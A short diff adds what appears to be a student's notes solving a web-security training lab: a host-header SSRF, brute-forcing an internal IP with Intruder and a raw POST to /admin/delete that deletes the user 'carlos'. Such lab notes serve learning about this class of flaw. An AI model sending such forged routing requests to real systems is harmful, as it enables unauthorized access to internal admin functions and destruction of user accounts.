@@ -1,0 +1,10 @@
+happens when you can input collaborator payload into the host header 
+solution to deleting user carlos:
+
+bruteforce internal IP with intruder
+
+POST /admin/delete HTTP/2
+Host: 192.168.0.51
+
+csrf=8H3qAZBfvXgOMDHGhanBv48Wg4bleReq&username=carlos
+
